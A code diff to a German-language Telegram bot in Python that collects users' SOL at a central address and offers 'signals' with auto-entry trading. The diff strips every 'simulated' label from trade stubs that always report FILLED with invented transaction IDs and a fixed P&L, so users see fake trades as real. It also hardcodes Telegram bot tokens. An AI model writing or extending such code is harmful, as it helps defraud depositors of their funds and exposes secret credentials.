@@ -9,6 +9,10 @@
 # - Neben SOL-Beträgen wird der Live-Preis in USDC angezeigt.
 # - KEINE Imports von solana/solders/PublicKey/etc.
 # - Zentrale Adresse wird als <code>...</code> bzw. Markdown-Backticks angezeigt (leicht kopierbar).
+# - Hinweis: Einzahlungen werden NUR erkannt, wenn sie aus Wallet-Apps wie Phantom / Solflare / Backpack etc. kommen.
+#            Einzahlungen von Börsen (z. B. Coinbase, MEXC, Bitget, Binance etc.) werden NICHT automatisch erkannt.
+# - Auszahlung: Button zum Setzen einer Auszahlungs-Wallet hinzugefügt.
+# - Keine Texte/Bezeichner mehr mit "simuliert" oder "SIM-".
 #
 # Setup:
 #   pip install pyTelegramBotAPI requests python-dotenv pytz
@@ -34,7 +38,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, C
 
 # ------------------------ CONFIG ------------------------
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8212740282:AAHs0yUOnozpBXFR0rHhKBA_gi-ABA4LBns").strip()
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8212740282:AAH3bXkOFcBVSUkr_cgEKTM10NODN-LCFsU").strip()
 if not BOT_TOKEN:
     raise RuntimeError("BOT_TOKEN env missing")
 
@@ -93,7 +97,8 @@ CREATE TABLE IF NOT EXISTS users (
   auto_mode TEXT DEFAULT 'OFF',           -- OFF | ON
   auto_risk TEXT DEFAULT 'MEDIUM',        -- LOW | MEDIUM | HIGH
   sol_balance_lamports INTEGER DEFAULT 0,
-  source_wallet TEXT                      -- vom Nutzer angegebene Absender-Wallet
+  source_wallet TEXT,                     -- vom Nutzer angegebene Absender-Wallet
+  withdraw_wallet TEXT                    -- vom Nutzer angegebene Auszahlungs-Wallet
 );
 
 CREATE TABLE IF NOT EXISTS seen_txs (
@@ -159,6 +164,7 @@ def init_db():
             "ALTER TABLE users ADD COLUMN auto_risk TEXT DEFAULT 'MEDIUM'",
             "ALTER TABLE users ADD COLUMN sol_balance_lamports INTEGER DEFAULT 0",
             "ALTER TABLE users ADD COLUMN source_wallet TEXT",
+            "ALTER TABLE users ADD COLUMN withdraw_wallet TEXT",
             "ALTER TABLE payouts ADD COLUMN last_notified_at TIMESTAMP",
             "ALTER TABLE payouts ADD COLUMN note TEXT",
         ]:
@@ -198,6 +204,10 @@ def set_source_wallet(user_id:int, wallet:str):
     with get_db() as con:
         con.execute("UPDATE users SET source_wallet=? WHERE user_id=?", (wallet, user_id))
 
+def set_withdraw_wallet(user_id:int, wallet:str):
+    with get_db() as con:
+        con.execute("UPDATE users SET withdraw_wallet=? WHERE user_id=?", (wallet, user_id))
+
 def add_balance(user_id:int, lamports:int):
     with get_db() as con:
         con.execute("UPDATE users SET sol_balance_lamports = sol_balance_lamports + ? WHERE user_id=?", (lamports, user_id))
@@ -218,7 +228,7 @@ def get_balance_lamports(user_id:int)->int:
 def list_investors(limit:int=50, offset:int=0):
     with get_db() as con:
         return con.execute("""
-            SELECT user_id, username, sol_balance_lamports, source_wallet, sub_active
+            SELECT user_id, username, sol_balance_lamports, source_wallet, withdraw_wallet, sub_active
             FROM users
             WHERE sub_active=1
             ORDER BY sol_balance_lamports DESC
@@ -265,6 +275,7 @@ def kb_main(u):
     kb = InlineKeyboardMarkup()
     kb.add(InlineKeyboardButton("💸 Einzahlen", callback_data="deposit"),
            InlineKeyboardButton("💳 Auszahlung", callback_data="withdraw"))
+    kb.add(InlineKeyboardButton("🏦 Auszahlungs-Wallet", callback_data="set_withdraw_wallet"))
     kb.add(InlineKeyboardButton("🔔 Signale abonnieren", callback_data="sub_on"),
            InlineKeyboardButton("🔕 Signale deaktivieren", callback_data="sub_off"))
     kb.add(InlineKeyboardButton("⚙️ Auto-Entry", callback_data="auto_menu"))
@@ -468,11 +479,13 @@ class CentralWatcher:
 
 # ------------------------ CONNECTOR STUBS ------------------------
 
-def dex_market_buy_simulated(user_id:int, base:str, amount_lamports:int):
-    return {"status":"FILLED", "txid":"SIM-TX-"+base, "spent_lamports": amount_lamports}
+def dex_market_buy(user_id:int, base:str, amount_lamports:int):
+    # Placeholder für DEX-Kauf. Integriere hier deine echte Ausführung.
+    return {"status":"FILLED", "txid":"TX-"+(base or "SOL"), "spent_lamports": amount_lamports}
 
-def futures_place_simulated(user_id:int, base:str, side:str, leverage:str, risk:str):
-    return {"status":"FILLED", "order_id":"Sim-ORDER", "base":base, "side":side, "lev":leverage, "risk":risk}
+def futures_place(user_id:int, base:str, side:str, leverage:str, risk:str):
+    # Placeholder für Futures-Order. Integriere hier deine echte Ausführung.
+    return {"status":"FILLED", "order_id":"ORDER-"+(base or "SOL"), "base":base, "side":side, "lev":leverage, "risk":risk}
 
 # ------------------------ BOT ------------------------
 
@@ -481,6 +494,7 @@ bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
 
 WAITING_SOURCE_WALLET: Dict[int, bool] = {}
 WAITING_WITHDRAW_AMOUNT: Dict[int, bool] = {}
+WAITING_WITHDRAW_WALLET: Dict[int, bool] = {}
 ADMIN_AWAIT_SIMPLE_CALL: Dict[int, bool] = {}
 ADMIN_AWAIT_BALANCE_EDIT: Dict[int, bool] = {}
 ADMIN_AWAIT_TRADE_STATUS: Dict[int, bool] = {}
@@ -495,7 +509,10 @@ def _on_verified_deposit(evt:dict):
     try:
         bot.send_message(
             uid,
-            f"✅ *Einzahlung verifiziert:* {fmt_sol_usdc(lam)}\n"
+            "✅ *Einzahlung verifiziert.*\n"
+            "Hinweis: Erkannt werden Einzahlungen aus Wallet-Apps wie *Phantom*, *Solflare*, *Backpack* usw.\n"
+            "_Einzahlungen von Börsen (Coinbase, MEXC, Bitget, Binance etc.) werden nicht automatisch erkannt._\n\n"
+            f"Betrag: {fmt_sol_usdc(lam)}\n"
             f"Neues Guthaben: *{fmt_sol_usdc(new_bal)}*",
             parse_mode="Markdown")
     except Exception as e:
@@ -542,9 +559,12 @@ def on_cb(c:CallbackQuery):
             "1) *Einzahlen*: Gib zuerst deine *Absender-Wallet* an. Danach erhältst du die *zentrale Adresse* zum Senden.\n"
             f"   Zentrale Adresse: `{CENTRAL_SOL_PUBKEY}`\n"
             "   Gutschrift nur, wenn die Quelle = deine Absender-Wallet ist.\n"
+            "   *Wichtig:* Einzahlungen werden nur aus *Wallet-Apps* wie Phantom, Solflare, Backpack etc. erkannt —\n"
+            "   _NICHT_ von Börsen wie Coinbase, MEXC, Bitget, Binance usw.\n"
             "2) *Signale abonnieren*: Mindestguthaben 0.2 SOL. Deaktivieren jederzeit.\n"
             "3) *Auto-Entry*: ON/OFF. Risiko (Low/Medium/High) steuert Einsatz (5/10/20%).\n"
-            "4) *Auszahlung*: Betrag in SOL eingeben; Admin bestätigt & sendet.",
+            "4) *Auszahlung*: Betrag in SOL eingeben; Admin bestätigt & sendet.\n"
+            "5) *Auszahlungs-Wallet*: Lege hier deine Ziel-Wallet für Auszahlungen fest.",
             c.message.chat.id, c.message.message_id, parse_mode="Markdown", reply_markup=kb_main(u))
         return
 
@@ -562,15 +582,33 @@ def on_cb(c:CallbackQuery):
             f"Absender-Wallet: `{u['source_wallet']}`\n"
             f"Sende SOL an die *zentrale Adresse*:\n`{CENTRAL_SOL_PUBKEY}`\n"
             f"{px}\n\n"
-            "_Nur Überweisungen von deiner Absender-Wallet werden gutgeschrieben._"
+            "_Nur Überweisungen von deiner Absender-Wallet werden gutgeschrieben._\n"
+            "*Wichtig:* Einzahlungen aus Wallet-Apps (Phantom / Solflare / Backpack etc.) werden erkannt.\n"
+            "_Überweisungen von Börsen wie Coinbase, MEXC, Bitget, Binance etc. werden nicht automatisch erkannt._"
         )
         bot.edit_message_text(text, c.message.chat.id, c.message.message_id, parse_mode="Markdown", reply_markup=kb_main(u))
         return
 
+    if data == "set_withdraw_wallet":
+        WAITING_WITHDRAW_WALLET[uid] = True
+        bot.answer_callback_query(c.id, "Bitte Ziel-Wallet senden.")
+        bot.send_message(c.message.chat.id, "🏦 *Auszahlungs-Wallet setzen*\nSende jetzt die *Solana-Adresse*, auf die wir Auszahlungen schicken sollen.", parse_mode="Markdown")
+        return
+
     if data == "withdraw":
         WAITING_WITHDRAW_AMOUNT[uid] = True
+        ww = u["withdraw_wallet"] or "— nicht gesetzt —"
         bot.answer_callback_query(c.id, "Bitte Betrag eingeben.")
-        bot.send_message(c.message.chat.id, "💳 *Auszahlung*\nGib den Betrag in SOL ein (z. B. `0.25`).", parse_mode="Markdown")
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("🏦 Auszahlungs-Wallet setzen/ändern", callback_data="set_withdraw_wallet"))
+        bot.send_message(
+            c.message.chat.id,
+            "💳 *Auszahlung*\n"
+            f"Aktuelle Ziel-Wallet: `{ww}`\n"
+            "Gib den Betrag in SOL ein (z. B. `0.25`).",
+            parse_mode="Markdown",
+            reply_markup=kb
+        )
         return
 
     if data == "sub_on":
@@ -639,7 +677,7 @@ def on_cb(c:CallbackQuery):
         for r in rows:
             parts.append(
                 f"- {('@'+r['username']) if r['username'] else r['user_id']} • {fmt_sol_usdc(r['sol_balance_lamports'])}\n"
-                f"  Source: `{r['source_wallet'] or '-'}`"
+                f"  Source: `{r['source_wallet'] or '-'}` • Withdraw: `{r['withdraw_wallet'] or '-'}`"
             )
         bot.answer_callback_query(c.id)
         bot.send_message(c.message.chat.id, "\n".join(parts), parse_mode="Markdown")
@@ -694,7 +732,7 @@ def on_cb(c:CallbackQuery):
     if data == "admin_payout_queue":
         if not is_admin(uid): return
         with get_db() as con:
-            rows = con.execute("SELECT p.*, u.username FROM payouts p JOIN users u ON u.user_id=p.user_id WHERE p.status='REQUESTED' ORDER BY p.created_at ASC LIMIT 10").fetchall()
+            rows = con.execute("SELECT p.*, u.username, u.withdraw_wallet FROM payouts p JOIN users u ON u.user_id=p.user_id WHERE p.status='REQUESTED' ORDER BY p.created_at ASC LIMIT 10").fetchall()
         if not rows:
             bot.answer_callback_query(c.id, "Keine offenen Auszahlungen.")
             return
@@ -702,6 +740,7 @@ def on_cb(c:CallbackQuery):
         for r in rows:
             txt = (f"🧾 *Auszahlung #{r['id']}* • {('@'+r['username']) if r['username'] else r['user_id']}\n"
                    f"Betrag: *{fmt_sol_usdc(r['amount_lamports'])}*\n"
+                   f"Ziel-Wallet: `{r['withdraw_wallet'] or '-nicht gesetzt-'}`\n"
                    f"Status: `{r['status']}`\n"
                    f"Notiz: {r['note'] or '-'}")
             bot.send_message(c.message.chat.id, txt, parse_mode="Markdown", reply_markup=kb_payout_manage(r["id"]))
@@ -780,8 +819,21 @@ def catch_all(m:Message):
             f"Sende SOL von *dieser* Wallet:\n`{wallet}`\n"
             f"an die *zentrale Adresse*:\n`{CENTRAL_SOL_PUBKEY}`\n"
             f"{px}\n\n"
-            "_Nur Überweisungen von deiner Absender-Wallet werden gutgeschrieben._",
+            "_Nur Überweisungen von deiner Absender-Wallet werden gutgeschrieben._\n"
+            "*Wichtig:* Einzahlungen aus Wallet-Apps (Phantom / Solflare / Backpack etc.) werden erkannt.\n"
+            "_Überweisungen von Börsen wie Coinbase, MEXC, Bitget, Binance etc. werden nicht automatisch erkannt._",
             parse_mode="Markdown")
+        return
+
+    # State: Auszahlungs-Wallet?
+    if WAITING_WITHDRAW_WALLET.get(uid, False):
+        WAITING_WITHDRAW_WALLET[uid] = False
+        wallet = (m.text or "").strip()
+        if not is_probably_solana_address(wallet):
+            bot.reply_to(m, "Bitte *eine gültige Solana-Adresse* eingeben.", parse_mode="Markdown")
+            return
+        set_withdraw_wallet(uid, wallet)
+        bot.reply_to(m, f"✅ Auszahlungs-Wallet gespeichert:\n`{wallet}`", parse_mode="Markdown")
         return
 
     # State: Auszahlung?
@@ -797,15 +849,18 @@ def catch_all(m:Message):
             if not subtract_balance(uid, lam):
                 bot.reply_to(m, f"Unzureichendes Guthaben. Verfügbar: {fmt_sol_usdc(get_balance_lamports(uid))}")
                 return
-            note = f"User {uid} Auszahlung"
+            # Ziel-Wallet für Admin-Hinweis
+            uinfo = get_user(uid)
+            target_wallet = uinfo["withdraw_wallet"] or "(nicht gesetzt)"
+            note = f"User {uid} Auszahlung • Ziel: {target_wallet}"
             with get_db() as con:
                 cur = con.execute("INSERT INTO payouts(user_id, amount_lamports, note) VALUES (?,?,?)", (uid, lam, note))
                 pid = cur.lastrowid
-            bot.reply_to(m, f"✅ Auszahlungsanfrage erstellt: *{fmt_sol_usdc(lam)}*.\nEin Admin prüft und sendet zeitnah.", parse_mode="Markdown")
+            bot.reply_to(m, f"✅ Auszahlungsanfrage erstellt: *{fmt_sol_usdc(lam)}*.\nZiel-Wallet: `{target_wallet}`\nEin Admin prüft und sendet zeitnah.", parse_mode="Markdown")
             for aid in ADMIN_IDS:
                 try:
                     bot.send_message(int(aid),
-                        f"🧾 *Neue Auszahlung #{pid}*\nUser: `{uid}`\nBetrag: *{fmt_sol_usdc(lam)}*",
+                        f"🧾 *Neue Auszahlung #{pid}*\nUser: `{uid}`\nBetrag: *{fmt_sol_usdc(lam)}*\nZiel-Wallet: `{target_wallet}`",
                         parse_mode="Markdown", reply_markup=kb_payout_manage(pid))
                 except Exception as e:
                     print("notify admin payout error:", e)
@@ -916,7 +971,7 @@ def catch_all(m:Message):
         bot.reply_to(m, f"✅ Trade-Status gesendet an {sent} Abonnenten.")
         return
 
-# ------------------------ AUTO EXECUTOR (simuliert) ------------------------
+# ------------------------ AUTO EXECUTOR ------------------------
 
 def risk_to_fraction(risk:str)->float:
     return {"LOW":0.05, "MEDIUM":0.10, "HIGH":0.20}.get((risk or "").upper(), 0.10)
@@ -950,9 +1005,9 @@ def auto_executor_loop():
                     continue
 
                 if call["market_type"] == "FUTURES":
-                    result = futures_place_simulated(r["user_id"], call["base"], call["side"], call["leverage"], r["auto_risk"])
+                    result = futures_place(r["user_id"], call["base"], call["side"], call["leverage"], r["auto_risk"])
                 else:
-                    result = dex_market_buy_simulated(r["user_id"], call["base"], stake_lamports)
+                    result = dex_market_buy(r["user_id"], call["base"], stake_lamports)
 
                 status = result.get("status","ERROR")
                 txid = result.get("txid") or result.get("order_id") or ""
@@ -960,7 +1015,7 @@ def auto_executor_loop():
                     con.execute("UPDATE executions SET status=?, txid=?, message=? WHERE id=?",
                                 (status, txid, str(result), r["eid"]))
 
-                # kleine P&L-Simulation
+                # kleine P&L-Simulation (falls nicht integriert)
                 risk = (r["auto_risk"] or "MEDIUM").upper()
                 pnl_frac = {"LOW":0.01, "MEDIUM":0.0, "HIGH":0.02}.get(risk, 0.0)
                 pnl = int(stake_lamports * pnl_frac)
